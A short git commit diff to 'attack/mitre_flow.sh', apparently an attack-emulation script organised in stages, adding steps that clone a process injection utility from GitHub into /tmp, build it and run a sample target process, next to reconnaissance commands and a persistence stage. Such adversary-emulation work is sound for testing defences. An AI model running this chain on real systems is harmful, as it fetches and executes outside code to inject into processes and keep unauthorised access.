535aec118e3ab80f7f64f2843ea884380f0294a6
Jeremy Chow <27985157+jeremyjevon@users.noreply.github.com>
2022-10-24 17:15:13 +0800

    Update mitre_flow.sh

--- attack/mitre_flow.sh
+++ attack/mitre_flow.sh
@@ -26,6 +26,19 @@ make
 whoami
 id
 
+# Download KK5 Process Injection Utility
+cd /tmp/pe
+git clone https://github.com/josh0xA/K55.git
+
+# Build Process Injection Utility
+cd K55
+chmod +x build-install.sh
+./build-install.sh
+
+# Run a Sample Process (Terminal 1)
+cd k55_example_process
+./k55_test_process
+
 ################# STAGE 3 #################
 
 ### SUID PERSISTENCE ###
